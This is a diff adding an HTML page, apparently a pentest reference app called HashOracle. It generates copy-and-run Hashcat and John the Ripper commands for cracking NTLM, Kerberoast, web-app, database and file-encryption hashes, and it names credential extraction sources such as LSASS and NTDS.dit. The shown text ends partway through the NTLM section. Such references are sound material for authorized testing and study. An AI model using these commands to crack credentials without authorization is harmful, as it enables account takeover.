@@ -1,0 +1,1444 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HashOracle — Universal Hash Cracking Command Center</title>
+<style>
+:root {
+  --bg:#07090a;--surface:#0d1117;--surface2:#161b22;--surface3:#21262d;
+  --border:#30363d;--border2:#444c56;--text:#e6edf3;--text2:#8b949e;
+  --text3:#6e7681;--green:#3fb950;--green2:#238636;--red:#f85149;
+  --amber:#e3b341;--blue:#58a6ff;--purple:#bc8cff;--cyan:#79c0ff;
+  --accent:#1f6feb;--teal:#39d353;--pink:#f778ba;--orange:#f0883e;
+  --mono:'Cascadia Code','Fira Code','JetBrains Mono',Consolas,'Courier New',monospace;
+  --sans:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{height:100%}
+body{background:var(--bg);color:var(--text);font-family:var(--sans);font-size:13px;height:100%;display:flex;flex-direction:column;overflow:hidden}
+::-webkit-scrollbar{width:6px;height:6px}
+::-webkit-scrollbar-track{background:var(--surface)}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}
+::-webkit-scrollbar-thumb:hover{background:var(--text3)}
+
+#header{background:var(--surface);border-bottom:1px solid var(--border);padding:0 16px;height:48px;display:flex;align-items:center;justify-content:space-between;flex-shrink:0;z-index:100}
+#header .logo{display:flex;align-items:center;gap:10px;font-family:var(--mono);font-size:15px;font-weight:700;letter-spacing:-0.3px;color:var(--text)}
+#header .logo .bracket{color:var(--red)}
+#header .logo .word{color:var(--green)}
+#header .badge{font-size:10px;background:rgba(248,81,73,.15);color:var(--red);border:1px solid rgba(248,81,73,.3);border-radius:4px;padding:2px 6px;font-family:var(--mono);letter-spacing:1px}
+#header .hdr-right{display:flex;align-items:center;gap:10px}
+#payload-counter{font-size:11px;color:var(--text3);font-family:var(--mono);background:var(--surface2);border:1px solid var(--border);border-radius:4px;padding:3px 8px;white-space:nowrap}
+#search-global{background:var(--surface2);border:1px solid var(--border);border-radius:6px;color:var(--text);font-family:var(--mono);font-size:12px;padding:6px 12px;width:260px;outline:none;transition:border-color .15s}
+#search-global:focus{border-color:var(--accent)}
+#search-global::placeholder{color:var(--text3)}
+
+#app{display:flex;flex:1;overflow:hidden}
+#sidebar{width:210px;background:var(--surface);border-right:1px solid var(--border);overflow-y:auto;flex-shrink:0;padding:8px 0}
+.nav-group{margin-bottom:4px}
+.nav-group-label{font-size:10px;font-weight:600;letter-spacing:1.2px;color:var(--text3);padding:8px 16px 4px;text-transform:uppercase}
+.nav-item{display:flex;align-items:center;gap:8px;padding:7px 16px;cursor:pointer;color:var(--text2);font-size:12.5px;transition:background .1s,color .1s;border-left:2px solid transparent;user-select:none}
+.nav-item:hover{background:var(--surface2);color:var(--text)}
+.nav-item.active{background:rgba(31,111,235,.12);color:var(--blue);border-left-color:var(--blue)}
+.nav-item .icon{font-size:14px;width:16px;text-align:center}
+.nav-sep{height:1px;background:var(--border);margin:6px 0}
+#main{flex:1;overflow-y:auto;padding:20px 24px}
+
+.page{display:none}.page.active{display:block}
+.section-header{margin-bottom:20px}
+.section-header h1{font-size:20px;font-weight:600;color:var(--text);display:flex;align-items:center;gap:10px}
+.section-header p{color:var(--text2);margin-top:4px;font-size:13px;line-height:1.5}
+
+.card{background:var(--surface);border:1px solid var(--border);border-radius:8px;margin-bottom:12px;overflow:hidden}
+.card-header{background:var(--surface2);border-bottom:1px solid var(--border);padding:10px 14px;display:flex;align-items:center;justify-content:space-between;gap:8px}
+.card-title{font-size:12px;font-weight:600;color:var(--text);font-family:var(--mono);display:flex;align-items:center;gap:6px}
+.card-body{padding:14px}
+
+.payload-item{display:flex;align-items:flex-start;gap:10px;padding:8px 10px;border-radius:5px;transition:background .1s;margin-bottom:2px}
+.payload-item:hover{background:var(--surface2)}
+.payload-code{flex:1;font-family:var(--mono);font-size:12px;color:var(--green);line-height:1.5;word-break:break-all;cursor:text;user-select:all}
+.payload-desc{font-size:11px;color:var(--text3);margin-top:2px}
+.payload-actions{display:flex;gap:4px;flex-shrink:0}
+
+.btn{border:none;border-radius:5px;cursor:pointer;font-size:11px;font-weight:500;padding:5px 10px;transition:all .15s;display:inline-flex;align-items:center;gap:4px;font-family:var(--sans)}
+.btn-copy{background:var(--surface3);color:var(--text2);border:1px solid var(--border)}
+.btn-copy:hover{background:var(--border);color:var(--text)}
+.btn-copy.copied{background:rgba(63,185,80,.15);color:var(--green);border-color:var(--green2)}
+.btn-primary{background:var(--accent);color:#fff;padding:7px 14px;font-size:12px}
+.btn-primary:hover{background:#388bfd}
+.btn-green{background:var(--green2);color:#fff;padding:7px 14px;font-size:12px}
+.btn-green:hover{background:#2ea043}
+.btn-danger{background:rgba(248,81,73,.15);color:var(--red);border:1px solid rgba(248,81,73,.3);padding:6px 12px}
+.btn-danger:hover{background:rgba(248,81,73,.25)}
+.btn-outline{background:transparent;color:var(--text2);border:1px solid var(--border);padding:6px 12px}
+.btn-outline:hover{border-color:var(--border2);color:var(--text)}
+
+.input,.select,.textarea{background:var(--surface2);border:1px solid var(--border);border-radius:5px;color:var(--text);font-family:var(--mono);font-size:12px;padding:7px 10px;outline:none;transition:border-color .15s;width:100%}
+.input:focus,.select:focus,.textarea:focus{border-color:var(--accent)}
+.input::placeholder,.textarea::placeholder{color:var(--text3)}
+.select{cursor:pointer}.select option{background:var(--surface2)}
+.textarea{resize:vertical;min-height:80px;line-height:1.5}
+.label{font-size:11px;font-weight:600;color:var(--text2);margin-bottom:4px;text-transform:uppercase;letter-spacing:.5px}
+.form-row{margin-bottom:12px}
+.form-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.form-grid-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px}
+.form-grid-4{display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:12px}
+
+.tag{display:inline-flex;align-items:center;border-radius:4px;padding:2px 7px;font-size:10px;font-weight:600;letter-spacing:.3px;font-family:var(--mono)}
+.tag-green{background:rgba(63,185,80,.15);color:var(--green)}
+.tag-red{background:rgba(248,81,73,.15);color:var(--red)}
+.tag-blue{background:rgba(88,166,255,.15);color:var(--blue)}
+.tag-amber{background:rgba(227,179,65,.15);color:var(--amber)}
+.tag-purple{background:rgba(188,140,255,.15);color:var(--purple)}
+.tag-cyan{background:rgba(121,192,255,.15);color:var(--cyan)}
+.tag-teal{background:rgba(57,211,83,.12);color:var(--teal)}
+.tag-pink{background:rgba(247,120,186,.12);color:var(--pink)}
+.tag-orange{background:rgba(240,136,62,.12);color:var(--orange)}
+
+.tabs{display:flex;gap:0;border-bottom:1px solid var(--border);margin-bottom:16px;flex-wrap:wrap}
+.tab{padding:8px 16px;font-size:12px;cursor:pointer;color:var(--text2);border-bottom:2px solid transparent;transition:all .15s;font-weight:500;user-select:none}
+.tab:hover{color:var(--text)}
+.tab.active{color:var(--blue);border-bottom-color:var(--blue)}
+.tab-content{display:none}.tab-content.active{display:block}
+
+.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.grid-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px}
+.divider{height:1px;background:var(--border);margin:16px 0}
+.code-block{background:var(--surface2);border:1px solid var(--border);border-radius:6px;padding:12px 14px;font-family:var(--mono);font-size:12px;color:var(--green);line-height:1.6;word-break:break-all;position:relative;white-space:pre-wrap}
+.info-box{background:rgba(88,166,255,.08);border:1px solid rgba(88,166,255,.2);border-radius:6px;padding:10px 14px;font-size:12px;color:var(--text2);line-height:1.6;margin-bottom:12px}
+.info-box.warn{background:rgba(227,179,65,.08);border-color:rgba(227,179,65,.2);color:var(--amber)}
+.info-box.danger{background:rgba(248,81,73,.08);border-color:rgba(248,81,73,.2);color:var(--red)}
+.info-box.success{background:rgba(63,185,80,.08);border-color:rgba(63,185,80,.2);color:var(--green)}
+.gen-output{background:var(--surface2);border:1px solid var(--border);border-radius:6px;padding:14px;font-family:var(--mono);font-size:12px;color:var(--green);line-height:1.8;word-break:break-all;min-height:60px;white-space:pre-wrap;margin-top:12px;position:relative}
+.gen-output .copy-gen{position:absolute;top:8px;right:8px}
+
+.ref-table{width:100%;border-collapse:collapse;font-size:12px}
+.ref-table th{background:var(--surface2);border:1px solid var(--border);padding:8px 10px;text-align:left;color:var(--text2);font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.5px}
+.ref-table td{border:1px solid var(--border);padding:7px 10px;color:var(--text);vertical-align:top}
+.ref-table tr:hover td{background:var(--surface2)}
+.ref-table .cmd{font-family:var(--mono);color:var(--green);font-size:11px;word-break:break-all}
+.ref-table .tool{font-family:var(--mono);color:var(--amber);font-weight:600}
+.ref-table .proto{font-family:var(--mono);color:var(--cyan)}
+
+.step-list{counter-reset:step}
+.step{display:flex;gap:12px;margin-bottom:16px;align-items:flex-start}
+.step-num{width:26px;height:26px;border-radius:50%;background:var(--surface3);border:1px solid var(--border2);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:var(--amber);flex-shrink:0;font-family:var(--mono)}
+.step-content{flex:1}
+.step-title{font-size:13px;font-weight:600;color:var(--text);margin-bottom:4px}
+.step-body{color:var(--text2);font-size:12px;line-height:1.6}
+
+#notif-container{position:fixed;top:58px;right:16px;z-index:9999;display:flex;flex-direction:column;gap:6px}
+.notif{padding:10px 16px;border-radius:6px;font-size:12px;font-weight:500;animation:notif-in .2s ease;display:flex;align-items:center;gap:8px;min-width:200px;border:1px solid}
+.notif-success{background:rgba(63,185,80,.15);color:var(--green);border-color:var(--green2)}
+.notif-error{background:rgba(248,81,73,.12);color:var(--red);border-color:rgba(248,81,73,.3)}
+.notif-info{background:rgba(31,111,235,.12);color:var(--blue);border-color:rgba(31,111,235,.3)}
+@keyframes notif-in{from{transform:translateX(20px);opacity:0}to{transform:translateX(0);opacity:1}}
+
+/* Hash type cards grid */
+.hash-type-card{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:12px;cursor:pointer;transition:all .15s}
+.hash-type-card:hover{border-color:var(--accent);background:var(--surface2)}
+.hash-type-card.selected{border-color:var(--green);background:rgba(63,185,80,.06)}
+.hash-type-card .ht-name{font-weight:600;font-size:13px;color:var(--text);margin-bottom:4px}
+.hash-type-card .ht-mode{font-family:var(--mono);font-size:11px;color:var(--amber)}
+.hash-type-card .ht-example{font-family:var(--mono);font-size:10px;color:var(--text3);margin-top:4px;word-break:break-all;max-height:32px;overflow:hidden}
+
+/* Oracle result */
+.oracle-result{background:var(--surface);border:2px solid var(--green2);border-radius:10px;padding:18px;margin-top:16px}
+.oracle-result h2{font-size:16px;font-weight:600;color:var(--green);margin-bottom:12px;display:flex;align-items:center;gap:8px}
+.oracle-section{margin-bottom:16px}
+.oracle-section h3{font-size:13px;font-weight:600;color:var(--amber);margin-bottom:8px;text-transform:uppercase;letter-spacing:.5px}
+
+/* Filter chips */
+.filter-chips{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:12px}
+.chip{padding:4px 10px;border-radius:12px;font-size:11px;cursor:pointer;border:1px solid var(--border);color:var(--text2);background:var(--surface2);transition:all .15s;font-family:var(--mono)}
+.chip:hover{border-color:var(--accent);color:var(--text)}
+.chip.active{background:rgba(31,111,235,.15);border-color:var(--accent);color:var(--blue)}
+
+@media(max-width:900px){
+  #sidebar{width:46px}
+  .nav-item span.nav-label{display:none}
+  .nav-group-label{display:none}
+  .form-grid,.form-grid-3,.form-grid-4{grid-template-columns:1fr}
+  .grid-2,.grid-3{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+
+<div id="header">
+  <div class="logo">
+    <span class="bracket">[</span><span class="word">Hash</span><span>Oracle</span><span class="bracket">]</span>
+    <span class="badge">By @Mahdiesta</span>
+  </div>
+  <div class="hdr-right">
+    <div id="payload-counter">Loading...</div>
+    <input type="text" id="search-global" placeholder="Search hash types... (Ctrl+K)" spellcheck="false">
+  </div>
+</div>
+
+<div id="app">
+<nav id="sidebar">
+  <div class="nav-group">
+    <div class="nav-group-label">Crack</div>
+    <div class="nav-item active" onclick="nav('oracle')"><span class="icon">&#x1F52E;</span><span class="nav-label">Hash Oracle</span></div>
+    <div class="nav-item" onclick="nav('identify')"><span class="icon">&#x1F50D;</span><span class="nav-label">Hash Identifier</span></div>
+    <div class="nav-item" onclick="nav('builder')"><span class="icon">&#x2699;&#xFE0F;</span><span class="nav-label">Attack Builder</span></div>
+  </div>
+  <div class="nav-sep"></div>
+  <div class="nav-group">
+    <div class="nav-group-label">Encyclopedia</div>
+    <div class="nav-item" onclick="nav('os-hashes')"><span class="icon">&#x1F4BB;</span><span class="nav-label">OS Hashes</span></div>
+    <div class="nav-item" onclick="nav('web-hashes')"><span class="icon">&#x1F310;</span><span class="nav-label">Web & App Hashes</span></div>
+    <div class="nav-item" onclick="nav('ad-hashes')"><span class="icon">&#x1F3E2;</span><span class="nav-label">AD & Kerberos</span></div>
+    <div class="nav-item" onclick="nav('file-hashes')"><span class="icon">&#x1F4C1;</span><span class="nav-label">File Hashes</span></div>
+    <div class="nav-item" onclick="nav('db-hashes')"><span class="icon">&#x1F5C4;</span><span class="nav-label">Database Hashes</span></div>
+    <div class="nav-item" onclick="nav('crypto-hashes')"><span class="icon">&#x1F512;</span><span class="nav-label">Crypto & Raw</span></div>
+  </div>
+  <div class="nav-sep"></div>
+  <div class="nav-group">
+    <div class="nav-group-label">Tools</div>
+    <div class="nav-item" onclick="nav('extraction')"><span class="icon">&#x1F9F0;</span><span class="nav-label">Hash Extraction</span></div>
+    <div class="nav-item" onclick="nav('wordlists')"><span class="icon">&#x1F4D6;</span><span class="nav-label">Wordlists & Rules</span></div>
+    <div class="nav-item" onclick="nav('masks')"><span class="icon">&#x1F3AD;</span><span class="nav-label">Mask Builder</span></div>
+    <div class="nav-item" onclick="nav('benchmark')"><span class="icon">&#x1F4CA;</span><span class="nav-label">Benchmark</span></div>
+    <div class="nav-item" onclick="nav('troubleshoot')"><span class="icon">&#x1F527;</span><span class="nav-label">Troubleshoot</span></div>
+    <div class="nav-item" onclick="nav('cheatsheet')"><span class="icon">&#x1F4D6;</span><span class="nav-label">Cheat Sheet</span></div>
+  </div>
+</nav>
+
+<div id="main">
+
+<!-- ============= PAGE: HASH ORACLE (Main) ============= -->
+<div class="page active" id="page-oracle">
+  <div class="section-header">
+    <h1>&#x1F52E; Hash Oracle — Crack Any Hash</h1>
+    <p>Paste any hash or select a type. Get exact, copy-paste-ready cracking commands for Hashcat, John the Ripper, and specialized tools.</p>
+  </div>
+
+  <div class="info-box success"><strong>How it works:</strong> Paste your hash below OR select a hash type from the dropdown. The Oracle will give you every command you need to crack it — extraction, identification, dictionary, rules, mask, and hybrid attacks. Just copy and run.</div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F52E; The Oracle — Paste Hash or Select Type</div><span class="tag tag-green">INTERACTIVE</span></div>
+    <div class="card-body">
+      <div class="form-row">
+        <div class="label">Paste Your Hash (auto-detect)</div>
+        <textarea class="textarea" id="oracle-hash" placeholder="Paste any hash here... Examples:&#10;5f4dcc3b5aa765d61d8327deb882cf99&#10;$6$rounds=5000$saltsalt$hash...&#10;$krb5tgs$23$*user$realm$...&#10;user::DOMAIN:challenge:response:blob" rows="3" oninput="oracleAutoDetect()"></textarea>
+      </div>
+      <div class="divider"></div>
+      <div class="form-grid-3">
+        <div class="form-row">
+          <div class="label">Or Select Hash Type</div>
+          <select class="select" id="oracle-type" onchange="oracleFromSelect()">
+            <option value="">-- Choose a hash type --</option>
+            <optgroup label="Operating System">
+              <option value="ntlm">NTLM (Windows)</option>
+              <option value="ntlmv2">Net-NTLMv2 (Responder)</option>
+              <option value="ntlmv1">Net-NTLMv1</option>
+              <option value="lm">LM Hash (Legacy)</option>
+              <option value="dcc1">Domain Cached Creds v1</option>
+              <option value="dcc2">Domain Cached Creds v2 (DCC2)</option>
+              <option value="sha512crypt">sha512crypt ($6$) Linux</option>
+              <option value="sha256crypt">sha256crypt ($5$) Linux</option>
+              <option value="md5crypt">md5crypt ($1$) Linux</option>
+              <option value="bcrypt">bcrypt ($2a$/$2y$)</option>
+              <option value="yescrypt">yescrypt ($y$)</option>
+              <option value="descrypt">descrypt (DES)</option>
+              <option value="macos">macOS PBKDF2-SHA512</option>
+            </optgroup>
+            <optgroup label="Active Directory / Kerberos">
+              <option value="kerberoast">Kerberoast TGS-REP ($krb5tgs$23$)</option>
+              <option value="kerberoast-aes">Kerberoast AES ($krb5tgs$17/18$)</option>
+              <option value="asrep">AS-REP Roast ($krb5asrep$23$)</option>
+            </optgroup>
+            <optgroup label="Web Applications">
+              <option value="wordpress">WordPress ($P$)</option>
+              <option value="drupal7">Drupal 7 ($S$)</option>
+              <option value="joomla">Joomla (md5:salt)</option>
+              <option value="phpass">phpass / phpBB3</option>
+              <option value="django-pbkdf2">Django PBKDF2-SHA256</option>
+              <option value="flask">Flask / Werkzeug</option>
+            </optgroup>
+            <optgroup label="Database">
+              <option value="mysql41">MySQL 4.1+ (*hex)</option>
+              <option value="mysql323">MySQL 3.x</option>
+              <option value="mssql2012">MSSQL 2012+</option>
+              <option value="mssql2005">MSSQL 2005</option>
+              <option value="postgres">PostgreSQL MD5</option>
+              <option value="oracle11g">Oracle 11g+</option>
+              <option value="mongodb">MongoDB SCRAM</option>
+            </optgroup>
+            <optgroup label="File Encryption">
+              <option value="keepass">KeePass (.kdbx)</option>
+              <option value="ssh-key">SSH Private Key</option>
+              <option value="zip">ZIP Archive</option>
+              <option value="rar">RAR Archive</option>
+              <option value="7z">7-Zip Archive</option>
+              <option value="pdf">PDF Document</option>
+              <option value="office">MS Office Document</option>
+              <option value="bitlocker">BitLocker</option>
+              <option value="veracrypt">VeraCrypt</option>
+              <option value="gpg">GPG / PGP</option>
+              <option value="putty">PuTTY Key (.ppk)</option>
+              <option value="wpa">WPA/WPA2 WiFi</option>
+            </optgroup>
+            <optgroup label="Raw / Generic">
+              <option value="md5">MD5 (raw)</option>
+              <option value="sha1">SHA-1 (raw)</option>
+              <option value="sha256">SHA-256 (raw)</option>
+              <option value="sha512">SHA-512 (raw)</option>
+              <option value="md4">MD4 (raw)</option>
+              <option value="sha1-salted">SHA-1 salted (sha1($salt.$pass))</option>
+              <option value="sha256-salted">SHA-256 salted</option>
+              <option value="hmac-sha256">HMAC-SHA256</option>
+              <option value="ntlm-raw">NTLM (raw, 32 hex)</option>
+              <option value="crc32">CRC32</option>
+            </optgroup>
+            <optgroup label="Network / Protocol">
+              <option value="snmp">SNMP Community String</option>
+              <option value="jwt">JWT (HS256/384/512)</option>
+              <option value="cisco-type5">Cisco Type 5 ($1$)</option>
+              <option value="cisco-type8">Cisco Type 8 ($8$)</option>
+              <option value="cisco-type9">Cisco Type 9 ($9$)</option>
+            </optgroup>
+          </select>
+        </div>
+        <div class="form-row">
+          <div class="label">Hash File Path</div>
+          <input class="input" id="oracle-hashfile" placeholder="hash.txt" value="hash.txt">
+        </div>
+        <div class="form-row">
+          <div class="label">Wordlist</div>
+          <input class="input" id="oracle-wordlist" placeholder="/usr/share/wordlists/rockyou.txt" value="/usr/share/wordlists/rockyou.txt">
+        </div>
+      </div>
+      <div style="display:flex;gap:8px;margin-top:8px">
+        <button class="btn btn-green" onclick="oracleGenerate()" style="font-size:14px;padding:10px 24px">&#x26A1; Generate Cracking Commands</button>
+        <button class="btn btn-outline" onclick="oracleClear()">Clear</button>
+      </div>
+    </div>
+  </div>
+
+  <div id="oracle-output-wrap" style="display:none">
+    <div class="oracle-result" id="oracle-result">
+      <!-- filled by JS -->
+    </div>
+  </div>
+</div>
+
+<!-- ============= PAGE: HASH IDENTIFIER ============= -->
+<div class="page" id="page-identify">
+  <div class="section-header">
+    <h1>&#x1F50D; Hash Identifier</h1>
+    <p>Paste any hash to auto-detect its type, Hashcat mode, and JtR format.</p>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F50D; Paste Hash to Identify</div><span class="tag tag-green">INTERACTIVE</span></div>
+    <div class="card-body">
+      <div class="form-row"><input class="input" id="hi-hash" placeholder="Paste your hash here..." oninput="identifyHash()" style="font-size:14px;padding:10px"></div>
+      <div id="hi-results" style="margin-top:10px"></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F527; CLI Hash Identification Tools</div></div>
+    <div class="card-body">
+      <div class="payload-item"><div><div class="payload-code">hashid -m 'HASH_HERE'</div><div class="payload-desc">hashID with Hashcat mode (-m) output</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">nth --text 'HASH_HERE'</div><div class="payload-desc">name-that-hash (most accurate for ambiguous hashes). Install: pip3 install name-that-hash</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">haiti --hashcat 'HASH_HERE'</div><div class="payload-desc">haiti — comprehensive identifier. Install: gem install haiti-hash</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat --identify hash.txt</div><div class="payload-desc">Native Hashcat identification (v6.2.5+)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat --help | grep -i "ntlm"</div><div class="payload-desc">Search Hashcat modes by keyword</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F4CB; Common Hash Patterns Quick Ref</div></div>
+    <div class="card-body">
+      <table class="ref-table">
+        <tr><th>Pattern</th><th>Hash Type</th><th>Hashcat</th><th>JtR</th></tr>
+        <tr><td class="cmd">32 hex chars</td><td>MD5 / NTLM / MD4 / LM</td><td>0 / 1000</td><td>raw-md5 / nt</td></tr>
+        <tr><td class="cmd">40 hex chars</td><td>SHA1</td><td>100</td><td>raw-sha1</td></tr>
+        <tr><td class="cmd">64 hex chars</td><td>SHA-256</td><td>1400</td><td>raw-sha256</td></tr>
+        <tr><td class="cmd">128 hex chars</td><td>SHA-512</td><td>1700</td><td>raw-sha512</td></tr>
+        <tr><td class="cmd">$1$...</td><td>md5crypt</td><td>500</td><td>md5crypt</td></tr>
+        <tr><td class="cmd">$5$...</td><td>sha256crypt</td><td>7400</td><td>sha256crypt</td></tr>
+        <tr><td class="cmd">$6$...</td><td>sha512crypt</td><td>1800</td><td>sha512crypt</td></tr>
+        <tr><td class="cmd">$2y$/$2a$</td><td>bcrypt</td><td>3200</td><td>bcrypt</td></tr>
+        <tr><td class="cmd">$y$...</td><td>yescrypt</td><td>N/A</td><td>yescrypt</td></tr>
+        <tr><td class="cmd">user::DOMAIN:...</td><td>Net-NTLMv2</td><td>5600</td><td>netntlmv2</td></tr>
+        <tr><td class="cmd">$krb5tgs$23$...</td><td>Kerberoast TGS</td><td>13100</td><td>krb5tgs</td></tr>
+        <tr><td class="cmd">$krb5asrep$23$...</td><td>AS-REP Roast</td><td>18200</td><td>krb5asrep</td></tr>
+        <tr><td class="cmd">$DCC2$...</td><td>Domain Cached Creds 2</td><td>2100</td><td>mscach2</td></tr>
+        <tr><td class="cmd">$P$/$H$</td><td>WordPress/phpBB</td><td>400</td><td>phpass</td></tr>
+        <tr><td class="cmd">$S$...</td><td>Drupal 7</td><td>7900</td><td>drupal7</td></tr>
+        <tr><td class="cmd">$keepass$...</td><td>KeePass</td><td>13400</td><td>keepass</td></tr>
+        <tr><td class="cmd">$sshng$...</td><td>SSH Key</td><td>22911-22951</td><td>ssh</td></tr>
+        <tr><td class="cmd">$bitlocker$0$...</td><td>BitLocker</td><td>22100</td><td>bitlocker</td></tr>
+        <tr><td class="cmd">$office$...</td><td>MS Office</td><td>9400-9600</td><td>office</td></tr>
+        <tr><td class="cmd">*hex (41 chars)</td><td>MySQL 4.1+</td><td>300</td><td>mysql-sha1</td></tr>
+        <tr><td class="cmd">0x0200...</td><td>MSSQL 2012+</td><td>1731</td><td>mssql12</td></tr>
+        <tr><td class="cmd">header.payload.sig</td><td>JWT</td><td>16500</td><td>—</td></tr>
+      </table>
+    </div>
+  </div>
+</div>
+
+<!-- ============= PAGE: ATTACK BUILDER ============= -->
+<div class="page" id="page-builder">
+  <div class="section-header">
+    <h1>&#x2699;&#xFE0F; Attack Builder</h1>
+    <p>Configure your attack parameters and generate ready-to-run Hashcat & JtR commands.</p>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x2699;&#xFE0F; Hashcat Command Builder</div><span class="tag tag-green">INTERACTIVE</span></div>
+    <div class="card-body">
+      <div class="form-grid-4">
+        <div class="form-row"><div class="label">Hashcat Mode (-m)</div><input class="input" id="hc-mode" placeholder="1000" value="1000"></div>
+        <div class="form-row"><div class="label">Attack Mode</div><select class="select" id="hc-attack">
+          <option value="0">Dictionary (-a 0)</option>
+          <option value="0r">Dictionary + Rules (-a 0 -r)</option>
+          <option value="3">Mask / Brute-Force (-a 3)</option>
+          <option value="1">Combinator (-a 1)</option>
+          <option value="6">Hybrid: Wordlist + Mask (-a 6)</option>
+          <option value="7">Hybrid: Mask + Wordlist (-a 7)</option>
+        </select></div>
+        <div class="form-row"><div class="label">Hash File</div><input class="input" id="hc-hashfile" placeholder="hash.txt" value="hash.txt"></div>
+        <div class="form-row"><div class="label">Wordlist</div><input class="input" id="hc-wordlist" placeholder="/usr/share/wordlists/rockyou.txt" value="/usr/share/wordlists/rockyou.txt"></div>
+      </div>
+      <div class="form-grid-3">
+        <div class="form-row"><div class="label">Rule File (for -a 0 -r)</div><input class="input" id="hc-rules" placeholder="/usr/share/hashcat/rules/best64.rule" value="/usr/share/hashcat/rules/best64.rule"></div>
+        <div class="form-row"><div class="label">Mask (for -a 3/6/7)</div><input class="input" id="hc-mask" placeholder="?u?l?l?l?l?d?d?s" value="?u?l?l?l?l?d?d?s"></div>
+        <div class="form-row"><div class="label">Options</div><label style="display:flex;align-items:center;gap:6px;margin-top:8px;cursor:pointer"><input type="checkbox" id="hc-force"><span style="color:var(--text2);font-size:12px">--force (suppress warnings)</span></label></div>
+      </div>
+      <div style="display:flex;gap:8px;margin-top:10px">
+        <button class="btn btn-green" onclick="genHashcat()">&#x26A1; Generate Hashcat</button>
+        <button class="btn btn-primary" onclick="genJohn()">&#x1F529; Generate JtR</button>
+      </div>
+      <div class="gen-output" id="hc-output" style="display:none"><button class="btn btn-copy copy-gen" onclick="copyEl('hc-output')">&#x1F4CB; Copy</button></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F4A1; Attack Strategy Guide</div></div>
+    <div class="card-body">
+      <div class="step-list">
+        <div class="step"><div class="step-num">1</div><div class="step-content"><div class="step-title">Dictionary Attack (fastest first pass)</div><div class="step-body">hashcat -m MODE hash.txt rockyou.txt<br>Tries every word in the wordlist as-is. Start here always.</div></div></div>
+        <div class="step"><div class="step-num">2</div><div class="step-content"><div class="step-title">Dictionary + Rules (best bang for buck)</div><div class="step-body">hashcat -m MODE hash.txt rockyou.txt -r best64.rule<br>Mutates wordlist with common patterns: capitalize, append numbers, leet speak.</div></div></div>
+        <div class="step"><div class="step-num">3</div><div class="step-content"><div class="step-title">Dictionary + Aggressive Rules</div><div class="step-body">hashcat -m MODE hash.txt rockyou.txt -r rockyou-30000.rule<br>30,000 mutations per word. Slow but comprehensive.</div></div></div>
+        <div class="step"><div class="step-num">4</div><div class="step-content"><div class="step-title">Mask Attack (pattern-based brute force)</div><div class="step-body">hashcat -a 3 -m MODE hash.txt '?u?l?l?l?l?d?d?s'<br>When you know the password pattern. Much faster than full brute force.</div></div></div>
+        <div class="step"><div class="step-num">5</div><div class="step-content"><div class="step-title">Hybrid Attack (wordlist + mask)</div><div class="step-body">hashcat -a 6 -m MODE hash.txt rockyou.txt '?d?d?d?s'<br>Appends mask to every word: password123!, Winter2024#</div></div></div>
+        <div class="step"><div class="step-num">6</div><div class="step-content"><div class="step-title">Combinator (word1 + word2)</div><div class="step-body">hashcat -a 1 -m MODE hash.txt wordlist1.txt wordlist2.txt<br>Combines two wordlists: sun + flower = sunflower</div></div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ============= PAGE: OS HASHES ============= -->
+<div class="page" id="page-os-hashes">
+  <div class="section-header">
+    <h1>&#x1F4BB; OS Hashes</h1>
+    <p>Windows NTLM, Linux shadow, macOS hashes — complete cracking commands.</p>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F5A5; Windows — NTLM (Mode 1000)</div><span class="tag tag-blue">MOST COMMON</span></div>
+    <div class="card-body">
+      <div class="info-box">NTLM hashes are 32 hex characters. NOT salted — identical passwords = identical hashes. Fastest hash to crack (~100 GH/s on RTX 3090). Extracted from SAM, LSASS, NTDS.dit, secretsdump.</div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt</div><div class="payload-desc">Basic dictionary attack</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule</div><div class="payload-desc">Dictionary + best64 rules (recommended first attack)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
